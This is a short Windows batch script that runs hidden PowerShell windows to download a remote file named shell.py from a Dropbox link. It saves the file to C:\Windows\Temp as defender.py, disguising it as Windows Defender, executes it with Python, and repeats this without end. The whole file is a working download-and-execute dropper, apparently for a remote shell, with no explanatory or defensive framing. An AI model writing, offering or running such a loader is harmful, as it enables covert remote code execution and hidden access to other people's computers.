@echo off 

:shell
powershell -WindowStyle hidden -c "cmd /c 'curl https://www.dropbox.com/s/hef82v4clobtj6z/shell.py?dl=0 --ssl-no-revoke -L -o C:\Windows\Temp\defender.py'"
powershell -WindowStyle hidden -c "python3 C:\Windows\Temp\defender.py"

GOTO shell